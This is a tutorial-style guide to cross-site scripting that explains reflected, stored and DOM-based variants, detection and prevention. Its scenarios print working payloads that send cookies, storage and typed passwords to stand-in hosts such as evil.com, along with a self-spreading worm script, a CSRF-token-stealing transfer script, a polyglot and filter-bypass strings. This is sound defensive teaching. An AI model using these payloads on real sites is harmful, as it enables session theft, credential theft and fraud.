Cross-site scripting (XSS) is a client-side injection attack where an attacker injects malicious scripts into web pages viewed by other users. Unlike SQL injection which targets the database, XSS targets the **browser** — it makes victims execute attacker-controlled JavaScript.

---

## How It Works

When user-supplied input is reflected or stored in a page without sanitisation, the browser interprets it as executable code rather than inert text.

**Vulnerable code (Node.js/Express):**

```javascript
app.get('/search', (req, res) => {
  res.send(`<p>Results for: ${req.query.q}</p>`);
});
```

**Attacker's input:**

```
/search?q=<script>alert('XSS')</script>
```

**Rendered HTML:**

```html
<p>Results for: <script>alert('XSS')</script></p>
```

The browser executes the script. From here the attacker can do far more than pop an alert.

---

## The Three Types of XSS

### 1. Reflected XSS (Non-Persistent)

The payload travels in the HTTP request and is immediately reflected back in the response. The victim must be tricked into clicking a crafted link.

**Attack vector:**

```
https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

The link is emailed or posted; clicking it sends the victim's session cookie to the attacker.

**Characteristics:**

- Not stored in the database
- Requires social engineering (phishing link)
- Affects only users who click the link
- Easy to test, common in search bars, error messages, form inputs

---

### 2. Stored XSS (Persistent)

The payload is saved to the database and served to every user who views the page. No crafted link needed.

**Attack vector (comment field):**

```html
Nice article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

Every subsequent visitor's browser executes the script. A single payload can compromise thousands of sessions.

**Characteristics:**

- Stored in database, shown to all users
- No social engineering after initial injection
- Higher severity — self-propagating in some cases
- Common in comments, profiles, message boards, product reviews

---

### 3. DOM-Based XSS

The vulnerability lives entirely in client-side JavaScript — the server never sees or processes the payload. The DOM is manipulated insecurely using attacker-controlled data.

**Vulnerable JavaScript:**

```javascript
// Reads from URL fragment (#) and writes directly to the DOM
const name = location.hash.slice(1);
document.getElementById('greeting').innerHTML = name;
```

**Attacker's URL:**

```
https://example.com/welcome#<img src=x onerror=alert(1)>
```

The server response is clean. The browser's own script creates the vulnerability.

**Common dangerous sinks:**

```javascript
element.innerHTML = userInput          // Executes HTML/JS
document.write(userInput)             // Same
eval(userInput)                        // Direct JS execution
location.href = userInput             // Open redirect / javascript: URI
setTimeout(userInput, 1000)           // Eval disguised
element.src = userInput               // javascript: URI injection
```

---

## What Attackers Can Do

|Impact|Description|
|---|---|
|Session hijacking|Steal `document.cookie` and impersonate the victim|
|Credential harvesting|Inject a fake login form over the real page|
|Keylogging|Attach `addEventListener('keypress', ...)` to capture passwords|
|Webcam/microphone access|Request browser permissions on behalf of the victim|
|CSRF bypass|Execute authenticated actions (transfers, changes) as the victim|
|Cryptomining|Run mining scripts in the victim's browser|
|Worm propagation|Stored XSS that re-injects itself, spreading to every viewer|
|Internal network scanning|Use the victim's browser to probe their internal network|
|Defacement|Alter visible page content to spread misinformation|

---

## How to Spot It

### In Code (Source Review)

Look for user-controlled data flowing into dangerous rendering/execution sinks without sanitisation.

**Server-side (vulnerable patterns):**

```python
# Python/Flask — BAD
return f"<p>Hello {request.args.get('name')}</p>"

# Jinja2 — BAD (|safe disables auto-escaping)
return render_template_string("<p>{{ name|safe }}</p>", name=user_input)
```

```php
# PHP — BAD
echo "<p>" . $_GET['name'] . "</p>";
echo "<p>" . $_REQUEST['search'] . "</p>";
```

```javascript
// Node.js/Express — BAD
res.send(`<div>${req.query.input}</div>`);
```

```java
// Java/JSP — BAD
out.println("<p>" + request.getParameter("name") + "</p>");
```

**Client-side (dangerous sinks to grep):**

```javascript
innerHTML
outerHTML
document.write(
document.writeln(
eval(
setTimeout(      // when passed a string, not a function
setInterval(     // same
location.href =
location.replace(
element.src =
element.action =
jQuery.html(
$().html(
```

**Red flags to grep for in source:**

```
innerHTML\s*=
outerHTML\s*=
document\.write\(
eval\(.*req\.|eval\(.*param|eval\(.*input
\$\(.*\)\.html\(
\.src\s*=.*location|\.src\s*=.*param
```

### In HTTP Traffic / Logs

Watch for HTML/JS metacharacters in parameters:

```
<  >  "  '  `  /  \
javascript:
onerror=  onload=  onclick=  onmouseover=
<script  </script>
<img  <svg  <iframe  <object  <embed
alert(  confirm(  prompt(
&#x  %3C  %3E  %22  (URL-encoded brackets/quotes)
```

**Example malicious requests:**

```
GET /search?q=<script>alert(1)</script>
GET /profile?name="><img src=x onerror=alert(document.cookie)>
GET /page#<svg onload=fetch('https://evil.com?c='+document.cookie)>
POST /comment  body: text=Hello<script>new Image().src='https://evil.com?c='+document.cookie</script>
```

### At Runtime (Behavioural Signals)

|Signal|What it suggests|
|---|---|
|Unexpected `alert()` / `confirm()` dialogs|Proof-of-concept XSS payload firing|
|CSP violation reports|Browser blocked an attempted script injection|
|Outbound requests to unknown domains in browser devtools|Exfiltration payload executing|
|Garbled or altered page layout/content|DOM manipulation via stored XSS|
|WAF/IDS alerts on `<script>`, `onerror=` etc.|Automated or manual probing|
|User reports of "weird popups" after visiting a page|Stored XSS already live|

---

## Real-World Scenario Examples

---

### Scenario 1: Reflected XSS — Session Hijacking via Search Bar

**Vulnerable PHP:**

```php
<?php echo "Results for: " . $_GET['q']; ?>
```

**Attacker crafts a phishing link:**

```
https://shop.com/search?q=<script>
  var img = new Image();
  img.src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**What happens:**

1. Victim receives email: "Your order has shipped — click to track"
2. Link points to the crafted URL above
3. Browser renders the page and executes the script
4. `document.cookie` (including `session=abc123`) is sent to `evil.com`
5. Attacker uses that cookie in their own browser → full account takeover, no password needed

---

### Scenario 2: Stored XSS Worm — MySpace/Samy Style

A social network stores user bio content and renders it for every profile visitor.

**Malicious bio payload:**

```html
<script>
  // 1. Execute whenever someone views this profile
  // 2. Add attacker as a friend
  fetch('/api/add-friend/attacker123', { method: 'POST', credentials: 'include' });

  // 3. Inject same payload into the viewer's own bio (propagation)
  fetch('/api/update-bio', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ bio: document.currentScript.outerHTML })
  });
</script>
```

**Result:** Every visitor automatically befriends the attacker and their profile also gets infected — exponential spread. This is nearly identical to how the Samy worm infected over 1 million MySpace profiles in 20 hours in 2005.

---

### Scenario 3: DOM-Based XSS — URL Fragment Injection

**Vulnerable client-side JavaScript:**

```javascript
// Reads the URL hash to personalise the page
const params = new URLSearchParams(location.hash.slice(1));
const username = params.get('user');
document.getElementById('welcome').innerHTML = 'Welcome back, ' + username + '!';
```

**Attacker's link (fragment never sent to server — WAF blind to it):**

```
https://app.com/dashboard#user=<img src=x onerror="
  fetch('https://evil.com/exfil', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      url: location.href
    })
  })
">
```

**Why it's dangerous:** The payload is in the URL fragment (`#`), which browsers never send to the server. Server-side WAFs and logs are completely blind to it.

---

### Scenario 4: XSS to CSRF — Performing Actions as the Victim

XSS gives full JS execution in the victim's browser, making CSRF trivial — no token bypass needed because the script can read and include the CSRF token.

**Scenario:** A banking app has CSRF protection, but is vulnerable to stored XSS in a transaction note field.

**Payload:**

```javascript
// Step 1: Fetch the transfer page to grab the CSRF token
fetch('/transfer', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    // Step 2: Extract the hidden CSRF token from the page
    const token = html.match(/name="csrf_token" value="([^"]+)"/)[1];

    // Step 3: Submit the transfer with the legitimate token
    fetch('/transfer', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `amount=5000&to=attacker_account&csrf_token=${token}`
    });
  });
```

**Result:** CSRF tokens are completely bypassed. The XSS runs in the victim's browser session with their cookies and same-origin access — it can read anything on the page.

---

### Scenario 5: Credential Harvesting via Fake Login Overlay

**Stored XSS payload injected into a forum post:**

```javascript
// Inject a pixel-perfect login modal over the real page
const overlay = document.createElement('div');
overlay.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:rgba(0,0,0,0.8);z-index:99999">
    <div style="background:#fff;width:400px;margin:150px auto;padding:40px;border-radius:8px">
      <h2>Session Expired — Please Log In</h2>
      <input id="xss-user" type="text" placeholder="Email" style="width:100%;padding:10px;margin:8px 0">
      <input id="xss-pass" type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0">
      <button onclick="
        fetch('https://evil.com/harvest', {
          method: 'POST',
          body: JSON.stringify({
            user: document.getElementById('xss-user').value,
            pass: document.getElementById('xss-pass').value,
            site: location.hostname
          })
        });
        this.closest('div').parentElement.remove();
      " style="width:100%;padding:12px;background:#007bff;color:#fff;border:none;cursor:pointer">
        Sign In
      </button>
    </div>
  </div>`;
document.body.appendChild(overlay);
```

The user sees a plausible "session expired" prompt on a domain they trust, types their credentials, and the overlay disappears — appearing to work normally.

---

### Scenario 6: Polyglot Payload — Bypassing Multiple Filters at Once

A polyglot works in multiple injection contexts simultaneously (attribute, tag, script block).

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

This single string fires as:

- A `javascript:` URI
- An inline event handler attribute value
- Inside a `<script>` block
- Inside a `<style>`, `<textarea>`, or `<title>` tag

Used to bypass naive keyword-based filters that only block lowercase `<script>` or `alert`.

---

### Scenario 7: Filter Bypass Techniques

When basic payloads are filtered, attackers use encoding and parser confusion.

**Case variation (bypasses case-sensitive filters):**

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

**No quotes or spaces (bypasses quote-stripping filters):**

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

**HTML entity encoding (browser decodes before execution):**

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<!-- Decoded: alert(1) -->
```

**JavaScript Unicode escaping:**

```javascript
\u0061\u006C\u0065\u0072\u0074(1)   // alert(1)
```

**Using `eval` with `atob` (Base64, bypasses string matching):**

```html
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
<!-- Base64 decodes to: alert(document.cookie) -->
```

**Event handler variety (bypasses `onerror` and `onload` blocking):**

```html
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>x</option></select>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

---

### Scenario 8: XSS via HTTP Headers (Lesser-Known Vectors)

Some apps reflect request headers in responses without sanitisation.

**Referer header injection:**

```
GET /page HTTP/1.1
Referer: <script>alert(1)</script>
```

If the app logs and displays the referring URL, the script fires for any admin viewing logs.

**User-Agent injection:**

```
User-Agent: Mozilla/5.0 <script>alert(1)</script>
```

Common in analytics dashboards that display browser stats.

**X-Forwarded-For injection:**

```
X-Forwarded-For: 127.0.0.1<script>alert(1)</script>
```

If the app stores the "IP address" for audit logs or "last login from" displays.

---

## Prevention

### 1. Output Encoding — Primary Defence

Encode all user-controlled data before inserting it into HTML. Different contexts need different encoding.

|Context|Example|Encoding needed|
|---|---|---|
|HTML body|`<p>USER_DATA</p>`|HTML entity encode: `&`, `<`, `>`, `"`, `'`|
|HTML attribute|`<input value="USER_DATA">`|HTML attribute encode|
|JavaScript string|`var x = "USER_DATA";`|JavaScript escape|
|CSS|`color: USER_DATA`|CSS escape|
|URL parameter|`href="/page?q=USER_DATA"`|URL percent-encode|

**Python (using Markupsafe):**

```python
from markupsafe import escape
safe = escape(user_input)   # <script> → &lt;script&gt;
```

**JavaScript (manual, or use a library like DOMPurify):**

```javascript
// Safe: textContent never interprets HTML
element.textContent = userInput;  // ✅

// Unsafe: innerHTML interprets HTML as markup
element.innerHTML = userInput;    // ❌

// If you must use innerHTML, sanitise first with DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);  // ✅
```

### 2. Content Security Policy (CSP)

CSP is a browser-enforced allowlist that restricts where scripts can load from and whether inline scripts are permitted.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; base-uri 'self'
```

- Blocks inline `<script>` tags and `javascript:` URIs
- Blocks scripts loaded from external attacker-controlled domains
- Provides a second layer if output encoding fails

**Add a reporting endpoint to detect violations:**

```http
Content-Security-Policy: ...; report-uri /csp-violations
```

### 3. Use Templating Engines with Auto-Escaping

Most modern frameworks escape by default — don't disable it.

```python
# Jinja2 — auto-escaping enabled (default in Flask)
# SAFE
return render_template('page.html', name=user_input)

# UNSAFE — disables escaping
return render_template_string("{{ name|safe }}", name=user_input)
```

```jsx
// React — JSX escapes by default
<p>{userInput}</p>  {/* ✅ safe */}
<p dangerouslySetInnerHTML={{__html: userInput}} />  {/* ❌ dangerous */}
```

### 4. Sanitise Rich HTML with a Allowlist Library

When you genuinely need users to submit HTML (e.g. rich text editors), use a server-side allowlist sanitiser — not a blocklist.

```javascript
// Node.js — DOMPurify (also works server-side via jsdom)
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'ul', 'li', 'p'],
  ALLOWED_ATTR: ['href', 'title']
});
```

```python
# Python — bleach
import bleach
clean = bleach.clean(user_html,
  tags=['b', 'i', 'a', 'p'],
  attributes={'a': ['href']},
  strip=True
)
```

### 5. HttpOnly and Secure Cookie Flags

Mitigate the impact of successful XSS by preventing JavaScript from reading session cookies.

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

`HttpOnly` means `document.cookie` cannot read the session — attacker scripts can't steal it directly. They can still make authenticated requests, but full session hijacking is harder.

### 6. Avoid Dangerous JavaScript Patterns

```javascript
// ❌ Never pass strings to these
eval(userInput)
setTimeout("doSomething(" + userInput + ")", 1000)
new Function(userInput)

// ✅ Pass functions instead
setTimeout(() => doSomething(userInput), 1000)
```

---

## Quick Reference: Test Payloads

Use these only on systems you own or have explicit permission to test.

```html
<!-- Basic confirmation -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Attribute injection (close the attribute first) -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>

<!-- Without quotes or angle brackets (CSP/filter bypass) -->
javascript:alert(1)
<img src=x onerror=alert`1`>

<!-- Inside a script block (close the string first) -->
';alert(1)//
\';alert(1)//

<!-- DOM-based (fragment) -->
#<img src=x onerror=alert(1)>

<!-- Cookie exfiltration PoC -->
<script>document.location='https://YOUR_SERVER/?c='+document.cookie</script>
<img src=x onerror="fetch('https://YOUR_SERVER/?c='+btoa(document.cookie))">
```

---

## Tools

|Tool|Purpose|
|---|---|
|[Burp Suite](https://portswigger.net/burp)|Intercept, modify, and replay requests; built-in XSS scanner|
|[OWASP ZAP](https://www.zaproxy.org)|Open-source scanner with XSS detection|
|[XSStrike](https://github.com/s0md3v/XSStrike)|Intelligent XSS detection with filter bypass|
|[DalFox](https://github.com/hahwul/dalfox)|Fast parameter analysis and XSS scanner|
|[CSP Evaluator](https://csp-evaluator.withgoogle.com)|Analyse the strength of a Content Security Policy|
|[DOMPurify](https://github.com/cure53/DOMPurify)|Client-side HTML sanitisation library|
|[PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)|Hands-on practice (legal)|
|[DVWA](https://dvwa.co.uk)|Locally hosted vulnerable app for practice|

---

## Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP DOM-Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)